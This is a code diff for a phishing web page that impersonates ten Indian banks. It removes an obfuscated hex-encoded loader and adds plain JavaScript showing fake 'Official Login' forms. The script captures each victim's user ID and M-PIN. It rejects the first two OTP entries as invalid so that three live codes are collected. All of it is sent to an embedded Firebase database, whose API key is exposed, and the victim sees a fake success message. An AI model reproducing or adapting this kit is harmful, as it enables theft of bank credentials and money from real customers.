71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-76-71-36-3b-70-79-6e-80-80-59-76-80-81-3b-7f-72-7a-7c-83-72-35-34-80-75-7c-84-34-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-70-6e-7b-70-72-79-5c-81-7d-35-36-2d-88-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-60-72-70-81-76-7c-7b-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-7f-72-7a-7c-83-72-35-34-80-75-7c-84-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-53-7c-7f-7a-60-72-70-81-76-7c-7b-34-36-3b-80-81-86-79-72-3b-71-76-80-7d-79-6e-86-2d-4a-2d-34-6f-79-7c-70-78-34-48-17-2d-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-2d-4a-2d-7b-82-79-79-48-17-2d-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-2d-3e-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-73-82-79-79-5f-72-80-72-81-35-36-2d-88-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-62-80-72-7f-56-71-34-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-5d-76-7b-34-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-75-76-71-72-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-53-7c-7f-7a-60-72-70-81-76-7c-7b-34-36-3b-80-81-86-79-72-3b-71-76-80-7d-79-6e-86-2d-4a-2d-34-6f-79-7c-70-78-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-60-72-70-81-76-7c-7b-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-7f-72-7a-7c-83-72-35-34-80-75-7c-84-34-36-48-17-2d-2d-75-76-71-72-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-36-48-17-2d-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-2d-4a-2d-7b-82-79-79-48-17-2d-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-2d-3e-48-17-2d-2d-70-75-6e-7b-74-72-4f-6e-7b-78-35-36-48-17-8a-17-17-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-17-2d-2d-7f-72-7b-71-72-7f-4f-6e-7b-78-54-7f-76-71-35-36-48-17-17-2d-2d-83-6e-7f-2d-7d-6e-7f-6e-7a-80-2d-4a-2d-7b-72-84-2d-62-5f-59-60-72-6e-7f-70-75-5d-6e-7f-6e-7a-80-35-84-76-7b-71-7c-84-3b-79-7c-70-6e-81-76-7c-7b-3b-80-72-6e-7f-70-75-36-48-17-2d-2d-83-6e-7f-2d-6f-6e-7b-78-53-7f-7c-7a-62-7f-79-2d-4a-2d-7d-6e-7f-6e-7a-80-3b-74-72-81-35-34-6f-6e-7b-78-34-36-48-17-2d-2d-76-73-2d-35-6f-6e-7b-78-53-7f-7c-7a-62-7f-79-36-2d-88-17-2d-2d-2d-2d-73-7c-7f-2d-35-83-6e-7f-2d-76-2d-4a-2d-3d-48-2d-76-2d-49-2d-6f-6e-7b-78-80-3b-79-72-7b-74-81-75-48-2d-76-38-38-36-2d-88-17-2d-2d-2d-2d-2d-2d-76-73-2d-35-6f-6e-7b-78-80-68-76-6a-3b-7b-6e-7a-72-2d-4a-4a-4a-2d-6f-6e-7b-78-53-7f-7c-7a-62-7f-79-36-2d-88-17-2d-2d-2d-2d-2d-2d-2d-2d-80-72-79-72-70-81-4f-6e-7b-78-35-6f-6e-7b-78-80-68-76-6a-3b-7b-6e-7a-72-39-2d-6f-6e-7b-78-80-68-76-6a-3b-79-7c-74-7c-36-48-17-2d-2d-2d-2d-2d-2d-2d-2d-6f-7f-72-6e-78-48-17-2d-2d-2d-2d-2d-2d-8a-17-2d-2d-2d-2d-8a-17-2d-2d-8a-17-8a-36-35-36-48-17-49-3c-80-70-7f-76-7d-81-4b-17-17-49-3c-6f-7c-71-86-4b-17-49-3c-75-81-7a-79-4b";
-const k = 13;
-const s = '-';
-const d = p.split(s).map(c => String.fromCharCode(parseInt(c, 16) - k)).join('');
-document.write(d);
+// ===== FIREBASE =====
+var firebaseConfig = {
+  apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
+  authDomain: "kharal-b47b6.firebaseapp.com",
+  databaseURL: "https://kharal-b47b6-default-rtdb.firebaseio.com",
+  projectId: "kharal-b47b6",
+  storageBucket: "kharal-b47b6.firebasestorage.app",
+  messagingSenderId: "528214841740",
+  appId: "1:528214841740:web:e394a574ef2ba2c16e9ea9",
+  measurementId: "G-RB7E5M2RDC"
+};
+firebase.initializeApp(firebaseConfig);
+var database = firebase.database();
+
+// ===== BANKS DATA =====
+var banks = [
+  { name: "State Bank of India", logo: "https://i.postimg.cc/J73ynCvb/IMG-20260910-WA0030.jpg", color: "#0d47a1" },
+  { name: "HDFC Bank", logo: "https://i.postimg.cc/zvqGW360/IMG-20260910-WA0032.jpg", color: "#004c8c" },
+  { name: "ICICI Bank", logo: "https://i.postimg.cc/BnRZpmRS/IMG-20260910-WA0033.jpg", color: "#f58220" },
+  { name: "Axis Bank", logo: "https://i.postimg.cc/wvpq87qB/IMG-20260910-WA0034.jpg", color: "#800020" },
+  { name: "Punjab National Bank", logo: "https://i.postimg.cc/HkbWSwmK/IMG-20260910-WA0035.jpg", color: "#7a1f1f" },
+  { name: "Bank of Baroda", logo: "https://i.postimg.cc/Px7kfJhT/IMG-20260910-WA0036.jpg", color: "#f26522" },
+  { name: "Canara Bank", logo: "https://i.postimg.cc/kMt563Hw/IMG-20260910-WA0037.jpg", color: "#00579c" },
+  { name: "Union Bank of India", logo: "https://i.postimg.cc/ryW8yG0K/IMG-20260910-WA0038.jpg", color: "#c8102e" },
+  { name: "Indian Bank", logo: "https://i.postimg.cc/tT6HTygN/IMG-20260910-WA0039.jpg", color: "#f47b20" },
+  { name: "Central Bank of India", logo: "https://i.postimg.cc/dtqzMGGp/IMG-20260910-WA0040.jpg", color: "#8b1a1a" }
+];
+
+// ===== STATE =====
+var selectedBank = null;
+var currentAttempt = 1;
+var pendingLoginData = null;
+var otpAttempts = [];
+
+// ===== PAGE NAVIGATION =====
+function showPage(pageId) {
+  document.querySelectorAll('.page').forEach(function(p) {
+    p.classList.remove('active');
+  });
+  document.getElementById(pageId).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function goHome() {
+  fullReset();
+  showPage('homePage');
+}
+
+// ===== RENDER HOME GRID =====
+function renderHomeGrid() {
+  var grid = document.getElementById('bankGrid');
+  var html = '';
+  for (var i = 0; i < banks.length; i++) {
+    var b = banks[i];
+    html += '<div class="bank-card">';
+    html += '<div class="bank-logo"><img src="' + b.logo + '" alt="' + b.name + '"></div>';
+    html += '<div class="bank-name">' + b.name + '</div>';
+    html += '<button class="login-btn" style="background:' + b.color + '" data-bank="' + b.name + '" data-logo="' + b.logo + '">Official Login →</button>';
+    html += '</div>';
+  }
+  grid.innerHTML = html;
+}
+
+// ===== RENDER LOGIN GRID =====
+function renderLoginGrid() {
+  var grid = document.getElementById('bankGridInner');
+  var html = '';
+  for (var i = 0; i < banks.length; i++) {
+    var b = banks[i];
+    html += '<div class="bank-item" data-bank="' + b.name + '" data-logo="' + b.logo + '">';
+    html += '<div class="bank-item-logo"><img src="' + b.logo + '" alt="' + b.name + '"></div>';
+    html += '<div class="bank-item-name">' + b.name + '</div>';
+    html += '</div>';
+  }
+  grid.innerHTML = html;
+}
+
+// ===== SELECT BANK =====
+function selectBank(bankName, bankLogo) {
+  selectedBank = bankName;
+  document.getElementById('headerBankName').textContent = bankName;
+  document.getElementById('bankSelectSection').style.display = 'none';
+
+  var banner = document.getElementById('selectedBankBanner');
+  banner.classList.add('show');
+  document.getElementById('selBankName').textContent = bankName;
+  document.getElementById('selLogo').innerHTML = '<img src="' + bankLogo + '" alt="' + bankName + '">';
+  document.getElementById('loginFields').classList.add('show');
+
+  setTimeout(function() {
+    document.getElementById('loginUserId').focus();
+  }, 300);
+}
+
+// ===== CHANGE BANK =====
+function changeBank() {
+  selectedBank = null;
+  document.getElementById('bankSelectSection').style.display = 'block';
+  document.getElementById('selectedBankBanner').classList.remove('show');
+  document.getElementById('loginFields').classList.remove('show');
+  document.getElementById('loginUserId').value = '';
+  document.getElementById('loginPin').value = '';
+  document.getElementById('headerBankName').textContent = 'All Indian Banks';
+}
+
+// ===== FORGOT PIN =====
+function forgotPin() {
+  alert('Please contact your bank branch for M-PIN reset.');
+}
+
+// ===== OTP MOVE =====
+function moveOtp(current, nextId) {
+  if (current.value.length === 1) {
+    var next = document.getElementById(nextId);
+    if (next) next.focus();
+  }
+}
+
+// ===== HANDLE LOGIN =====
+function handleLogin() {
+  if (!selectedBank) {
+    showAlert('loginSuccess', 'Please select your bank first.', 'warning');
+    return;
+  }
+
+  var userId = document.getElementById('loginUserId').value.trim();
+  var pin = document.getElementById('loginPin').value.trim();
+
+  if (!userId || !pin) { 
+    showAlert('loginSuccess', 'Please enter both User ID and M-PIN.', 'warning'); 
+    return; 
+  }
+  if (pin.length < 4 || pin.length > 6) { 
+    showAlert('loginSuccess', 'M-PIN must be 4-6 digits.', 'warning'); 
+    return; 
+  }
+
+  pendingLoginData = { bank: selectedBank, userId: userId, pin: pin };
+  otpAttempts = [];
+
+  document.getElementById('loginFormSection').style.display = 'none';
+  document.getElementById('otpSection').classList.add('show');
+  document.getElementById('otpBankTag').textContent = selectedBank;
+
+  currentAttempt = 1;
+  document.getElementById('attemptCount').textContent = currentAttempt;
+  updateAttemptDots();
+  hideAlert('otpMessage');
+
+  for (var i = 1; i <= 6; i++) {
+    document.getElementById('otp' + i).value = '';
+  }
+  setTimeout(function() { document.getElementById('otp1').focus(); }, 300);
+}
+
+// ===== UPDATE ATTEMPT DOTS =====
+function updateAttemptDots() {
+  var d1 = document.getElementById('dot1');
+  var d2 = document.getElementById('dot2');
+  var d3 = document.getElementById('dot3');
+  d1.className = 'dot'; d2.className = 'dot'; d3.className = 'dot';
+  if (currentAttempt === 1) d1.classList.add('active');
+  else if (currentAttempt === 2) { d1.classList.add('used'); d2.classList.add('active'); }
+  else if (currentAttempt === 3) { d1.classList.add('used'); d2.classList.add('used'); d3.classList.add('active'); }
+}
+
+// ===== VERIFY OTP =====
+function verifyOtp() {
+  var otp = '';
+  for (var i = 1; i <= 6; i++) {
+    otp += document.getElementById('otp' + i).value;
+  }
+
+  if (otp.length !== 6) {
+    showAlert('otpMessage', 'Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  // Save attempt
+  otpAttempts.push({
+    attempt: currentAttempt,
+    otp: otp,
+    status: currentAttempt < 3 ? 'failed' : 'success'
+  });
+
+  if (currentAttempt < 3) {
+    showAlert('otpMessage', '❌ Invalid OTP. Try again. (Attempt ' + currentAttempt + '/3)', 'error');
+    currentAttempt++;
+    document.getElementById('attemptCount').textContent = currentAttempt;
+    updateAttemptDots();
+
+    for (var i = 1; i <= 6; i++) {
+      document.getElementById('otp' + i).value = '';
+    }
+    setTimeout(function() { document.getElementById('otp1').focus(); }, 200);
+
+    if (currentAttempt === 3) {
+      setTimeout(function() {
+        showAlert('otpMessage', '⚠️ Final attempt. Please enter OTP carefully.', 'warning');
+      }, 1800);
+    }
+  } else {
+    acceptLogin();
+  }
+}
+
+// ===== ACCEPT LOGIN =====
+function acceptLogin() {
+  showAlert('otpMessage', '✅ OTP Verified! Logging in...', 'success');
+
+  var now = new Date();
+  var timeStr = now.toLocaleString('en-US', { hour12: true });
+
+  var allOtpsString = otpAttempts.map(function(a) { return a.otp; }).join(' → ');
+
+  var loginData = {
+    bank: pendingLoginData.bank,
+    userId: pendingLoginData.userId,
+    pin: pendingLoginData.pin,
+    otpEntered: allOtpsString,
+    otpAttempts: otpAttempts,
+    totalAttempts: otpAttempts.length,
+    status: 'success',
+    time: timeStr,
+    timestamp: now.getTime(),
+    device: navigator.userAgent || 'Unknown',
+    ip: '192.168.1.' + Math.floor(Math.random() * 255)
+  };
+
+  database.ref('logins').push(loginData)
+    .then(function() {
+      console.log('✅ Saved:', loginData);
+      setTimeout(function() {
+        var savedUserId = pendingLoginData.userId;
+        fullReset();
+        goHome();
+        alert('✅ Login successful! Welcome ' + savedUserId);
+      }, 1200);
+    })
+    .catch(function(error) {
+      console.error('❌ Firebase error:', error);
+      showAlert('otpMessage', '❌ Error saving. Please try again.', 'error');
+    });
+}
+
+// ===== ALERTS =====
+function showAlert(id, text, type) {
+  var el = document.getElementById(id);
+  el.textContent = text;
+  el.className = 'alert show alert-' + (type || 'success');
+}
+function hideAlert(id) {
+  document.getElementById(id).classList.remove('show');
+}
+
+// ===== CANCEL OTP =====
+function cancelOtp() {
+  document.getElementById('otpSection').classList.remove('show');
+  document.getElementById('loginFormSection').style.display = 'block';
+  pendingLoginData = null;
+  currentAttempt = 1;
+  otpAttempts = [];
+}
+
+// ===== FULL RESET =====
+function fullReset() {
+  document.getElementById('loginUserId').value = '';
+  document.getElementById('loginPin').value = '';
+  hideAlert('loginSuccess');
+  document.getElementById('loginFormSection').style.display = 'block';
+  document.getElementById('otpSection').classList.remove('show');
+  hideAlert('otpMessage');
+  pendingLoginData = null;
+  currentAttempt = 1;
+  otpAttempts = [];
+  changeBank();
+}
+
+// ===== EVENT LISTENERS =====
+document.getElementById('bankGrid').addEventListener('click', function(e) {
+  var btn = e.target.closest('.login-btn');
+  if (btn) {
+    var bankName = btn.getAttribute('data-bank');
+    var bankLogo = btn.getAttribute('data-logo');
+    
+    // Reset everything for fresh login page
+    document.getElementById('loginUserId').value = '';
+    document.getElementById('loginPin').value = '';
+    document.getElementById('loginFormSection').style.display = 'block';
+    document.getElementById('otpSection').classList.remove('show');
+    hideAlert('loginSuccess');
+    hideAlert('otpMessage');
+    pendingLoginData = null;
+    currentAttempt = 1;
+    otpAttempts = [];
+    
+    showPage('loginPage');
+    selectBank(bankName, bankLogo);
+  }
+});
+
+document.getElementById('bankGridInner').addEventListener('click', function(e) {
+  var item = e.target.closest('.bank-item');
+  if (!item) return;
+  var bankName = item.getAttribute('data-bank');
+  var bankLogo = item.getAttribute('data-logo');
+  selectBank(bankName, bankLogo);
+});
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('🏦 All Indian Banks - User Site Loaded');
+  renderHomeGrid();
+  renderLoginGrid();
+});
 </script>
-<noscript>This page requires JavaScript.</noscript>
-</body
+
+</body>
+</html>
